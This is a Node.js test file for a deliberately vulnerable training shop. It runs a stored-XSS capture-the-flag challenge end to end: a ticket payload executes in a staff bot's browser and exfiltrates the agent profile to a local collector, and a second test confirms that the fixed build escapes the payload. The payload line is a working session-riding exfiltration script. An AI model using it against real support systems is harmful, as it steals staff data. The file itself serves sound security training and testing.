// C03 part B, the whole loop with nothing faked (challenge-specs 3.8): the real shop (vulnerable build), the real bot controller with its browser (jsdom in a child process), the real
// collector of mock-services. A customer sends a ticket whose message carries a script; the bot opens it under its own session; the script reads the agent profile and sends it to
// the collector; the customer reads the flag on the listener page. The fixed build escapes the message: the bot still visits, nothing reaches the collector.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import { openDb } from '../../../apps/shop/src/db/index.mjs';
import { migrate } from '../../../apps/shop/src/db/migrate.mjs';
import { seedAll } from '../../../apps/shop/seed/registry.mjs';
import { createApp } from '../../../apps/shop/src/app.mjs';
import { createBotQueue } from '../../../apps/shop/src/challenges/c03b-bot.mjs';
import { createCollector } from '../../../services/mock-services/src/server.mjs';
import { createBotController } from '../../../services/bot/src/controller.mjs';
import { createBrowserVisitor } from '../../../services/bot/src/browser.mjs';

const FLAG = 'VM{' + 'LOOPFLAG'.repeat(3) + '}';
const listen = (server) => new Promise((resolve) => { const s = server.listen(0, '127.0.0.1', () => resolve(s)); });

async function stack(modes) {
  const db = openDb(':memory:');
  migrate(db);
  await seedAll(db);
  const events = [];
  const collector = createCollector({ instanceId: 'i-ABCDEFGHIJKLMNOP', eventsUrl: 'http://sidecar.invalid', post: (_url, e) => events.push(e) });
  const cs = await listen(collector.server);
  const collectorBase = `http://127.0.0.1:${cs.address().port}`;
  // the shop and the bot know each other's address only after both listen, so the shop gets its queue through a late-bound post
  let shopBase;
  let botBase;
  const queue = createBotQueue({ db, delayMs: 50, post: (_u, payload) => fetch(`${botBase}/visit`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(payload) }).then((r) => r.status).catch(() => 0) });
  const shop = createApp({ db, challenges: modes, flagOf: (k) => (k === 'C03' ? FLAG : undefined), bot: queue, mockUrl: collectorBase });
  const ss = await listen(shop);
  shopBase = `http://127.0.0.1:${ss.address().port}`;
  const bot = createBotController({ target: shopBase, maxVisitMs: 25000, visit: createBrowserVisitor({ origins: [shopBase, collectorBase], dwellMs: 1500 }), emit: (type, data) => events.push({ type, source: 'bot', data }) });
  const bs = await listen(bot.server);
  botBase = `http://127.0.0.1:${bs.address().port}`;
  return { shopBase, collectorBase, events, queue, close: () => { ss.close(); cs.close(); bs.close(); } };
}

async function customer(base) {
  const jar = new Map();
  const cookie = () => [...jar.entries()].map(([k, v]) => `${k}=${v}`).join('; ');
  const take = (r) => { for (const c of r.headers.getSetCookie?.() ?? []) { const [p] = c.split(';'); const i = p.indexOf('='); jar.set(p.slice(0, i), p.slice(i + 1)); } };
  const page = await fetch(`${base}/login`); take(page);
  const csrf0 = (await page.text()).match(/name="csrf" value="([^"]+)"/)[1];
  take(await fetch(`${base}/login`, { method: 'POST', headers: { cookie: cookie(), 'content-type': 'application/x-www-form-urlencoded' }, body: new URLSearchParams({ email: 'player.customer@vulnmart.test', password: 'player-customer-demo-b2', csrf: csrf0 }), redirect: 'manual' }));
  const again = await fetch(`${base}/login`, { headers: { cookie: cookie() } }); take(again);
  const csrf = (await again.text()).match(/name="csrf" value="([^"]+)"/)[1];
  return { get: (p) => fetch(`${base}${p}`, { headers: { cookie: cookie() } }).then((r) => r.text()), post: (p, o) => fetch(`${base}${p}`, { method: 'POST', headers: { cookie: cookie(), 'content-type': 'application/x-www-form-urlencoded' }, body: new URLSearchParams({ ...o, csrf }), redirect: 'manual' }) };
}

const payload = (collectorUrl) => `<img src=x onerror="fetch('/staff/api/agent-profile').then(function(r){return r.text()}).then(function(t){new Image().src='${collectorUrl}?d='+encodeURIComponent(t)})">`;

test('vulnerable build: the script in the ticket runs in the bot, the flag reaches the collector and the player reads it on the listener page', { timeout: 90000 }, async () => {
  const s = await stack({ C03B: 'vulnerable' });
  try {
    const c = await customer(s.shopBase);
    const listener = await c.get('/lab/listener');
    const collectorUrl = listener.match(/(http:\/\/127\.0\.0\.1:\d+\/c\/[a-z0-9]+)/)?.[1];
    assert.ok(collectorUrl, 'the listener page shows the collector address');
    assert.ok(!listener.includes(FLAG), 'nothing yet');
    const r = await c.post('/tickets', { subject: 'help', body: payload(collectorUrl) });
    assert.equal(r.status, 302);
    const id = r.headers.get('location').match(/\/tickets\/(\d+)/)[1];
    await s.queue.idle();
    const seen = await c.get(`/tickets/${id}`);
    assert.match(seen, /Agent has viewed this ticket at/);
    const after = await c.get('/lab/listener');
    assert.ok(after.includes(FLAG), 'the flag of the agent profile is on the listener page');
    const hit = s.events.find((e) => e.type === 'collector.hit');
    assert.equal(hit.data.bot_tagged, true);
    assert.equal(hit.data.collector_id_ok, true);
    assert.equal(hit.data.candidate_sha256.length, 64);
    assert.deepEqual(s.events.filter((e) => e.type === 'bot.visit').map((e) => e.data.phase), ['start', 'end']);
  } finally { s.close(); }
});

test('fixed build: the message is shown as text, the bot still visits, nothing reaches the collector', { timeout: 90000 }, async () => {
  const s = await stack({});
  try {
    const c = await customer(s.shopBase);
    const listener = await c.get('/lab/listener');
    const collectorUrl = listener.match(/(http:\/\/127\.0\.0\.1:\d+\/c\/[a-z0-9]+)/)[1];
    await c.post('/tickets', { subject: 'help', body: payload(collectorUrl) });
    await s.queue.idle();
    const after = await c.get('/lab/listener');
    assert.ok(!after.includes(FLAG));
    assert.equal(s.events.filter((e) => e.type === 'collector.hit').length, 0);
    assert.deepEqual(s.events.filter((e) => e.type === 'bot.visit').map((e) => e.data.phase), ['start', 'end']);
  } finally { s.close(); }
});